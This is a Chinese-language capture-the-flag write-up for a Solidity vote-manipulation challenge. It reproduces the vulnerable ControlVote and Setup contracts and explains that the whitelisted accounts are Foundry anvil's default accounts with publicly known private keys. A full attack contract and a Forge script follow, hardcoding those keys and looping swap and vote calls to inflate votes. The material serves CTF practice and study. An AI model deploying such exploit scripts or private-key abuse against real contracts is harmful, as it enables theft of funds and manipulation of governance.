# xiaoheizi

# 源码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ControlVote {
    event VoteDelegated(
        address indexed from,
        address indexed to,
        uint256 amount
    );
    event Voted(address indexed from, address indexed to, uint256 amount);
    event SwappedVotes(address indexed user, uint256 voteAmount);
    event VotesBurned(address indexed user);

    address public owner;
    address public constant competitor =
        0x1000000000000000000000000000000000000010;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public Votes;
    mapping(address => mapping(uint256 => uint256)) internal isdelegted;

    uint256 constant BITS_PER_WORD = 256;

    constructor() {
        owner = msg.sender;
        Votes[competitor] = 100;
    }

    function addWhitelist(address user) external {
        require(msg.sender == owner, "Not authorized");
        whitelisted[user] = true;
    }

    function joinWhitelist() external {
        require(!whitelisted[msg.sender], "Already joined once");
        require(Votes[msg.sender] >= 1, "Insufficient votes to join");
        whitelisted[msg.sender] = true;
    }

    function setshares(address user, uint256 _votes) external {
        require(msg.sender == owner, "Not authorized");
        shares[user] = _votes;
    }

    function _getIndices(
        address to
    ) internal pure returns (uint256 wordIndex, uint256 bitIndex) {
        uint256 index = uint160(to);
        wordIndex = index / BITS_PER_WORD;
        bitIndex = index % BITS_PER_WORD;
    }

    function grant(address to) external {
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        isdelegted[msg.sender][wordIndex] |= (1 << bitIndex);
    }

    function revoke(address to) external {
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        isdelegted[msg.sender][wordIndex] &= ~(1 << bitIndex);
    }

    function isAuthorized(address from, address to) public view returns (bool) {
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        return (isdelegted[from][wordIndex] >> bitIndex) & 1 == 1;
    }

    function delegate(address from, address to, uint256 _votes) external {
        require(isAuthorized(from, to), "Not authorized");
        require(whitelisted[from] && whitelisted[to], "Not whitelisted");
        require(shares[from] >= _votes, "Insufficient votes");
        require(from != to, "Cannot delegate to self");
        require(_votes > 0, "Votes must be greater than zero");
        shares[from] -= _votes;
        shares[to] += _votes;

        emit VoteDelegated(from, to, _votes);
    }

    function calculateVotingPowerHash(
        address user,
        uint256 salt
    ) external pure returns (bytes32) {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, user)
            mstore(add(ptr, 0x20), salt)
            mstore(add(ptr, 0x40), xor(user, salt))
            mstore(add(ptr, 0x60), shr(3, salt))
            mstore(add(ptr, 0x80), shl(5, user))
            let hashed := keccak256(ptr, 0xA0)

            mstore(0x0, hashed)
            return(0x0, 32)
        }
    }

    function swap() external {
        require(whitelisted[msg.sender], "Not whitelisted");
        uint256 userVotes = Votes[msg.sender];
        require(userVotes > 0, "No votes to swap");
        Votes[msg.sender] = 0;
        shares[msg.sender] += userVotes;

        emit SwappedVotes(msg.sender, userVotes);
    }

    function vote(address addr, uint256 numbers) public {
        require(whitelisted[msg.sender], "Not whitelisted");
        require(shares[msg.sender] >= numbers, "Insufficient votes");
        require(addr != msg.sender, "Cannot vote for self");
        shares[msg.sender] -= numbers;
        shares[addr] += numbers;
        Votes[addr] += numbers;

        emit Voted(msg.sender, addr, numbers);
    }

    function AssemblyLogic(address user) external view returns (uint256 kun) {
        assembly {
            let v := shr(2, shl(5, 1))
            let val := xor(v, 0x1234)
            kun := add(val, Votes.slot)
        }
    }

    function Optimizer() public view returns (uint256) {
        assembly {
            let t := mul(timestamp(), number())
            let h := blockhash(number())
            let fake := add(t, mod(mload(add(h, 0x20)), 1337))
            mstore(0x0, fake)
            return(0x0, 0x20)
        }
    }

    function buyVotes() external payable {
        require(msg.value >= 1 ether, "Min 1 ether");
        Votes[msg.sender] += msg.value / 1 ether;
    }

    function getVotes(address user) external view returns (uint256) {
        return Votes[user];
    }

    function getShare(address user) external view returns (uint256) {
        return shares[user];
    }

    function burnVotes() external {
        require(whitelisted[msg.sender], "Not whitelisted");
        Votes[msg.sender] = 0;
        emit VotesBurned(msg.sender);
    }

    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./1.sol";

/// @title Setup - Deployment and initialization of the ControlVote challenge
contract Setup {
    ControlVote public controlVote;
    address public immutable competitor;
    address private xiaoheizi1;
    address private xiaoheizi2;
    bool public solved;

    constructor(address _addr1, address _addr2) {
        controlVote = new ControlVote();
        competitor = controlVote.competitor();

        xiaoheizi1 = _addr1;
        xiaoheizi2 = _addr2;

        controlVote.addWhitelist(xiaoheizi1);
        controlVote.addWhitelist(xiaoheizi2);

        controlVote.setshares(xiaoheizi1, 2);
        controlVote.setshares(xiaoheizi2, 2);
    }

    function isSolved() external returns (bool) {
        if (controlVote.Votes(msg.sender) > controlVote.Votes(competitor)) {
            solved = true;
        }
        return solved;
    }
}

```

# 突破点
读槽setup两个xiaoheizi地址,会发现异常眼熟。。。。

**<font style="background-color:#FBDFEF;">其实就是foundry的anvil链账户1和2</font>**，那么这下就有俩账户的私钥了，这个限制解除那不就随便做了

前期一直没看出来这点，给我限制死了

# poc
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {ControlVote} from "./1.sol";
import {Setup} from "./setup.sol";

contract Attack {
    //接收票用
    ControlVote public controlvote;
    Setup public setup;
    address public xiaoheizi1;
    address public xiaoheizi2;

    // Competitor public competitor;

    constructor(Setup addr, address _xiaoheizi1, address _xiaoheizi2) {
        setup = Setup(addr);
        controlvote = ControlVote(payable(setup.controlVote()));
        xiaoheizi1 = _xiaoheizi1;
        xiaoheizi2 = _xiaoheizi2;
    }

    function attack() external payable {
        controlvote.buyVotes{value: 1 ether}(); //用1ether买一票
        controlvote.joinWhitelist(); //加入白名单
        controlvote.grant(xiaoheizi1); //授权
        controlvote.grant(xiaoheizi2); //授权
    }

    function go() public payable {
        controlvote.swap(); //票 => share
        controlvote.vote(xiaoheizi1, controlvote.getShare(address(this))); //用share给xiaoheizi1增加票和share
    }

    function go2() external payable {
        //controlvote.swap();//因为检查的是票不是share,所以就不需要这一步了,注意
        require(setup.isSolved() == true, "you are not true xioaehizi"); //检查攻击合约现在的票够不够
    }

    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

//import {Attack} from "../src/Attack.sol";
import {ControlVote} from "../src/1.sol";
import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";
import {Setup} from "../src/setup.sol";

contract Attacksc is Script {
    uint256 private constant XIAOHEIZI1_PRIVATE_KEY =
        0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 private constant XIAOHEIZI2_PRIVATE_KEY =
        0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    address private constant XIAOHEIZI1 =
        0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address private constant XIAOHEIZI2 =
        0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    address private constant SETUP_ADDRESS =
        0xc4EE942a184325E1e44B1c34FAE33ff2138442d8;

    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(
            Setup(0xc4EE942a184325E1e44B1c34FAE33ff2138442d8),
            0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266,
            0x70997970C51812dc3A010C7d01b50e0d17dc79C8
        );
        ControlVote controlvote = ControlVote(
            payable(0x61812A5eFdB9Eb0BA0f11A70b661292A91515f5C)
        );
        //Setup setup = Setup(0xc4EE942a184325E1e44B1c34FAE33ff2138442d8);
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.grant(address(attack)); //授权
        controlvote.grant(XIAOHEIZI2); //授权
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI2_PRIVATE_KEY);
        controlvote.grant(address(attack)); //授权
        controlvote.grant(XIAOHEIZI1); //授权
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.attack{value: 1 ether}(); //打钱
        attack.go();
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //以xiaoheizi1视角来把票 => share
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1)); //用share给攻击合约增加票和share
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1));
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1));
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1));
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1));
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1)); //最后到这里,用share给攻击合约增加share和票,相当于前边套来的最终都汇总到攻击合约
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go2(); //issolved检查

        vm.stopBroadcast();
    }
}

```



> 更新: 2025-09-12 10:39:39  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/auhygd58w6pddbx8>